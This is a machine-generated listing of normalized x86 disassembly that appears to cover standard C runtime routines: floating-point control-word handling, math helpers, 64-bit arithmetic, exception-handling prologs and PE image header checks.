and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_41b6c5
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
mov edx 0xfffff3ff
and eax 0x3
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
sub eax 0x1
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
sub eax 0x1
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_41c153
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_4135e3
mov [ eax ] 0x22
pop ebp
retn
sub_41c182
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub esp 0x20
xor ecx ecx
mov eax ecx
mov ecx [ eax * 8 + r--data ]
inc eax
cmp eax 0x1d
jl r-xdata
push 0xffff
push [ ebp + 0x28 ]
call sub_41b6d8
push [ ebp + 0x8 ]
call sub_41c153
fld [ ebp + 0x20 ]
add esp 0xc
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_41b6d8
lea eax [ ebp - 0x20 ]
push eax
call sub_4110aa
add esp 0xc
test eax eax
jne r-xdata
cmp [ eax * 8 + r--data ] edx
je r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
pop esi
jmp r-xdata
push esi
call sub_41c153
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
sub_41c224
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x7e80
je r-xdata
mov eax ecx
pop ebp
retn
test dl dl
jns r-xdata
push edi
mov edi 0x200
test edi edx
je r-xdata
push 0x10
pop ecx
test edx 0x400
je r-xdata
or ecx 0x8
test edx 0x800
je r-xdata
or ecx 0x4
test edx 0x1000
je r-xdata
or ecx 0x2
push esi
mov esi 0x6000
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x4000
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x2000
je r-xdata
or ecx 0x100
jmp r-xdata
pop edi
or ecx edi
sub_41c2a1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0xc3d
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ecx
test dl 0x8
je r-xdata
or ecx 0x8
test dl 0x10
je r-xdata
or ecx 0x4
test dl 0x20
je r-xdata
or ecx 0x2
push esi
mov esi 0xc00
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x800
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or ecx 0x100
jmp r-xdata
or ecx 0x200
sub_41c314
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
test dl 0x8
je r-xdata
inc ecx
test dl 0x4
je r-xdata
or ecx 0x4
test dl 0x2
je r-xdata
or ecx 0x8
test dl 0x1
je r-xdata
or ecx 0x10
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x20
test edx 0x200
je r-xdata
or ecx 0xc00
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x400
jmp r-xdata
or ecx 0x800
sub_41c385
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
push edi
mov edi 0x200
test dl 0x8
je r-xdata
mov ecx 0x80
test dl 0x4
je r-xdata
or ecx edi
test dl 0x2
je r-xdata
or ecx 0x400
test dl 0x1
je r-xdata
or ecx 0x800
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1000
test edi edx
je r-xdata
or ecx 0x6000
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x2000
jmp r-xdata
pop edi
or ecx 0x4000
sub_41c405
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test dl 0x1f
je r-xdata
mov eax ecx
pop ebp
retn
push esi
mov esi 0x10000010
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
mov esi 0x8000008
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
inc ecx
mov esi 0x4000004
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
or ecx 0x4
mov esi 0x2000002
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x8
mov eax 0x1000001
and edx eax
cmp edx eax
jne r-xdata
or ecx 0x10
or ecx 0x20
sub_41c466
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test dl 0x1f
je r-xdata
mov eax ecx
pop ebp
retn
push esi
mov esi 0x100010
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
mov esi 0x80008
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
inc ecx
mov esi 0x40004
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
or ecx 0x4
mov esi 0x20002
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x8
mov eax 0x10001
and edx eax
cmp edx eax
jne r-xdata
or ecx 0x10
or ecx 0x20
sub_41c4c7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
and [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
fnstcw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ebp - 0x4 ]
push esi
push eax
call sub_41c2a1
push [ ebp - 0x8 ]
mov esi eax
call sub_41c224
pop ecx
or eax esi
pop ecx
and eax 0x31f
pop esi
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
sub_41c50a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x8 ] ecx
fnstsw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx edx [ ebp - 0x4 ]
mov eax ecx
test dl 0x3d
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
test dl 0x3d
je r-xdata
test dl 0x1
je r-xdata
or eax ecx
and eax 0x1f1f001f
mov esp ebp
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
mov eax 0x100010
test dl 0x4
je r-xdata
mov ecx 0x10000010
test dl 0x8
je r-xdata
or eax 0x80008
test dl 0x8
je r-xdata
or ecx 0x8000008
test dl 0x10
je r-xdata
or eax 0x40004
test dl 0x10
je r-xdata
or ecx 0x4000004
test dl 0x20
je r-xdata
or eax 0x20002
test dl 0x20
je r-xdata
or ecx 0x2000002
or eax 0x10001
or ecx 0x1000001
sub_41c5b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x31f
push ebx
call sub_41c314
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x20 ]
call sub_41c314
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x20 ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_41c385
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_41c385
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_41c632
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x1f1f001f
push ebx
call sub_41c466
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x1c ]
call sub_41c466
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x1c ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_41c405
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_41c405
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_41c6de
mov edx 0x0
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
cmpsd xmm1 xmm0 0x0
pextrw eax xmm1 0x0
cmp eax 0x0
ja r-xdata
sub ecx 0x3fe
add ecx edx
cvtsi2sd xmm6 ecx
unpcklpd xmm6 xmm6
shl ecx 0xa
add eax ecx
mov ecx 0x10
mov edx 0x0
cmp eax 0x0
cmove edx ecx
movapd xmm1 [ r--data ]
movapd xmm3 xmm0
movapd xmm2 [ r--data ]
mulpd xmm1 xmm0
mulpd xmm3 xmm3
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm3
movapd xmm5 [ r--data ]
mulpd xmm6 xmm5
movapd xmm5 [ edx + r--data ]
andpd xmm4 xmm5
addpd xmm7 xmm6
addpd xmm7 xmm4
mulpd xmm1 xmm0
mulsd xmm3 xmm0
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulpd xmm2 xmm0
movapd xmm6 xmm7
unpckhpd xmm6 xmm6
mulpd xmm1 xmm3
sub esp 0x10
movapd xmm0 xmm1
addpd xmm1 xmm2
unpckhpd xmm0 xmm0
addsd xmm0 xmm1
addsd xmm0 xmm6
addsd xmm0 xmm7
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
movlpd xmm2 [ r--data ]
divsd xmm2 xmm0
movlpd xmm1 [ r--data ]
mov edx 0x8
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm1
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x10
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_415fd2
fld [ esp + 0x10 ]
add esp 0x1c
retn
movlpd xmm1 [ r--data ]
mulsd xmm0 xmm1
mov edx 0xffffffcc
jmp r-xdata
cmp ecx 0x7fe
ja r-xdata
movapd xmm5 xmm0
unpcklpd xmm0 xmm0
psrlq xmm5 0x34
pextrw ecx xmm5 0x0
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
movapd xmm3 [ r--data ]
movapd xmm4 [ r--data ]
movapd xmm6 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm3
addpd xmm4 xmm0
pextrw eax xmm4 0x0
and eax 0x7f0
movapd xmm4 [ eax + r--data ]
movapd xmm7 [ eax + r--data ]
andpd xmm6 xmm0
subpd xmm0 xmm6
mulpd xmm6 xmm4
subpd xmm6 xmm2
addsd xmm7 xmm6
mulpd xmm0 xmm4
movapd xmm4 xmm0
addpd xmm0 xmm6
and ecx 0xfff
sub ecx 0x1
cmp ecx 0x7fd
ja r-xdata
add ecx 0x1
and ecx 0x7ff
cmp ecx 0x7ff
jae r-xdata
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm2
cmpsd xmm2 xmm0 0x0
pextrw eax xmm2 0x0
cmp eax 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movlpd xmm0 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd ecx xmm2
and ecx 0xfffff
or eax ecx
cmp eax 0x0
je r-xdata
xorpd xmm1 xmm1
divsd xmm1 xmm1
mov edx 0x9
mov edx 0x3e9
jmp r-xdata
fld [ r--data ]
retn
mov edx 0x3e9
jmp r-xdata
sub_41c94b
jmp r-xdata
mov [ ebp - 0x90 ] 0xfe
or ch ch
jne r-xdata
call sub_41cae1
or eax eax
je r-xdata
fxch st1
jmp sub_41a8b3
xor ch ch
cmp eax 0x2
je r-xdata
call sub_41ca9e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
fxch st1
fabs
jmp r-xdata
not ch
test dl 0x40
jne r-xdata
fld1
fdivrp st1
fyl2x
jmp r-xdata
or ch ch
je r-xdata
fscale
jmp sub_41a7f8
fchs
sub_41c961
mov [ ebp - 0x90 ] 0xfe
xor ch ch
fldl2e
fmulp st1
call sub_41ca9e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
test dl 0x40
jne r-xdata
fld1
fdivrp st1
or ch ch
je r-xdata
fscale
jmp sub_41a7f8
fchs
sub_41ca0d
call sub_41cae1
fstp st0
fstp st0
or cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x2
fld [ r--data ]
cmp eax 0x1
jne r-xdata
fldz
cmp eax 0x1
jne r-xdata
retn
or ch ch
je r-xdata
or ch ch
je r-xdata
fchs
jmp r-xdata
fchs
sub_41ca9e
fld st0
fabs
fld [ r--data ]
fcompp
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x41
jne r-xdata
pop eax
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
fld st0
frndint
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
mov dl [ ebp - 0x9f ]
fxch st1
fsub st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fabs
f2xm1
retn
mov [ ebp - 0x90 ] 0x4
jmp sub_41a806
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
retn
fchs
sub_41cae1
fld st0
frndint
fcomp st1
fwait
fnstsw ax
sahf
jne r-xdata
mov eax 0x0
jmp r-xdata
fld st0
fmul [ r--data ]
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
je r-xdata
retn
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_41cb15
push esi
sub esp 0x74
mov esi esp
push esi
sub esp 0x8
fstp [ esp ]
sub esp 0x8
fstp [ esp ]
fwait
fnsave [ esi + 0x8 ]
call sub_41cdcb
add esp 0x14
frstor [ esi + 0x8 ]
fld [ esi ]
add esp 0x74
pop esi
test eax eax
je r-xdata
retn
jmp r-xdata
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_41cc00
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fucom st1
fnstsw ax
push edi
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
push ecx
fstp st0
push ecx
fstp [ esp ]
call sub_41ccd4
movzx edi si
add esp 0xc
shr edi 0x4
and edi 0x7ff
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_41ccd4
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_41ccd4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
and eax 0x800f
fstp [ ebp - 0x8 ]
lea ecx [ ecx + 0x3fe ]
shl ecx 0x4
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41cd03
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x7ff00000
mov eax [ ebp + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
test eax eax
jne r-xdata
mov cx [ ebp + 0xe ]
mov edx 0x7ff8
and cx dx
cmp cx dx
jne r-xdata
test eax eax
jne r-xdata
inc eax
pop ebp
retn
mov edx 0x7ff0
cmp cx dx
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_41cd61
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41cf0c
pop ecx
pop ecx
test al 0x90
jne r-xdata
xor eax eax
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41cef6
fld [ ebp + 0x8 ]
fucom st1
fnstsw ax
pop ecx
pop ecx
fstp st1
test ah 0x44
jpe r-xdata
fstp st0
fmul [ r--data ]
push ecx
push ecx
fst [ ebp - 0x8 ]
fstp [ esp ]
call sub_41cef6
fld [ ebp - 0x8 ]
fucompp
fnstsw ax
pop ecx
pop ecx
test ah 0x44
jpe r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41cdcb
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx 0x7ff00000
fabs
mov eax 0xfff00000
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x14 ] eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fstp st0
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fld [ r--data ]
jmp r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fldz
fld [ ebp + 0x10 ]
fcom st1
fnstsw ax
test ah 0x41
je r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fldz
jmp r-xdata
fstp [ eax ]
fstp st0
fldz
jmp r-xdata
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x10 ]
push ecx
push ecx
fstp [ esp ]
call sub_41cd61
fldz
fld [ ebp + 0x10 ]
pop ecx
pop ecx
fcom st1
mov ecx eax
fnstsw ax
test ah 0x41
jne r-xdata
fcomp st1
fnstsw ax
test ah 0x5
mov eax [ ebp + 0x18 ]
jpo r-xdata
fstp st0
fld [ r--data ]
jmp r-xdata
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
cmp ecx 0x1
jne r-xdata
fstp st0
fld1
jmp r-xdata
fstp st0
fld1
cmp ecx 0x1
jne r-xdata
fchs
jmp r-xdata
fstp st0
fld [ r--data ]
jmp r-xdata
sub_41cf0c
mov edi edi
push ebp
mov ebp esp
mov cx [ ebp + 0xe ]
mov edx 0x7ff0
mov ax cx
and ax dx
cmp ax dx
jne r-xdata
movzx ecx cx
and ecx 0x8000
test ax ax
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41cd03
pop ecx
pop ecx
sub eax 0x1
je r-xdata
fld [ ebp + 0x8 ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
sub eax 0x1
je r-xdata
neg ecx
sbb ecx ecx
and ecx 0xffffff08
lea eax [ ecx + 0x100 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffffe0
lea eax [ ecx + 0x40 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffff90
lea eax [ ecx + 0x80 ]
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
sub eax 0x1
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_41cfd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
add eax ecx
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d020
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40c430
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_41d0e0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_41cfd0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d0e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_41d111
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_41d150
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_41d1f0
push sub_40c430
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_41d250
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
